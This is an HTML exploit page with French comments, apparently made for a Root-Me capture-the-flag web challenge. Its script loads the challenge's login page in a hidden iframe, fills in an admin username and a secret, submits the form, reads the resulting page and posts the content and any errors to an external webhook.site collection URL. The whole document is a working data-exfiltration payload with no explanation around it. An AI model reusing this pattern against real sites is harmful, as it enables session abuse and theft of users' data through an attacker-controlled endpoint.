<!DOCTYPE html>
<html>
  <head>
    <title>Exploit SOME</title>
  </head>
  <body>
    <h1>Chargement...</h1>

    <iframe id="target" src="http://challenge01.root-me.org:58010/login" style="display:none;" onload="steal()"></iframe>

    <script>
      function steal() {
        const frame = document.getElementById("target");

        try {
          const doc = frame.contentWindow.document;

          const form = doc.querySelector("form");
          const user = doc.querySelector("#username");
          const secret = doc.querySelector("#secret");
          const csrf = doc.querySelector("input[name='csrf']");

          user.value = "admin";
          secret.value = "toto";

          // Attendre un peu que le DOM soit prêt
          setTimeout(() => {
            form.submit();

            // Attendre que la redirection se fasse
            setTimeout(() => {
              try {
                const result = frame.contentWindow.document.body.innerText;

                fetch("https://webhook.site/383980eb-38ac-4039-99bf-062454d3143b", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ data: result })
                });
              } catch (e) {
                fetch("https://webhook.site/383980eb-38ac-4039-99bf-062454d3143b", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ error: "Accès post-login refusé : " + e })
                });
              }
            }, 1000);
          }, 500);
        } catch (err) {
          fetch("https://webhook.site/383980eb-38ac-4039-99bf-062454d3143b", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ error: "Accès initial refusé : " + err })
          });
        }
      }
    </script>
  </body>
</html>
